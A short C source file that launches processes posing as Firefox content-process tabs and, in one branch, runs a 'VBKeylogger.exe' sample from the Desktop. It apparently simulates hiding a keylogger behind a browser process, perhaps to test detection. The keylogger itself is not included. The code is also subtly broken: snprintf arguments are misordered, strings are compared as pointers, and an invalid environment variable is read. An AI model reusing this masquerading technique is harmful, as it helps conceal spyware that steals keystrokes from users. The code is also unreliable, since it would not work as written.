#include "helpers.h"
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    const int bufferLen = 200;
    if (argv[argc-1] != "tab") {
        char firefoxPath[bufferLen];
        snprintf(firefoxPath, "\"%s\\Mozilla Firefox\\firefox.exe\"", getenv("ProgramFiles"), bufferLen);
        char tabPathA[bufferLen];
        snprintf(tabPathA, "%s -contentproc 2856 1f464f12858 tab", firefoxPath, bufferLen);
        run_command(tabPathA);
        char tabPathB[bufferLen];
        snprintf(tabPathB, "%s -contentproc 5620 1f46498d558 tab", firefoxPath, bufferLen);
        run_command(tabPathB);
        char tabPathC[bufferLen];
        snprintf(tabPathC, "%s -contentproc 6288 1f464f0fe58 tab", firefoxPath, bufferLen);
        run_command(tabPathC);
    }
    else if (argv[argc-3] == "5620"){
        char samplePath[bufferLen];
        snprintf(samplePath, "%s\\VBKeylogger.exe", getenv("Desktop"), bufferLen);
        run_command(samplePath);
    }
    return 0;
}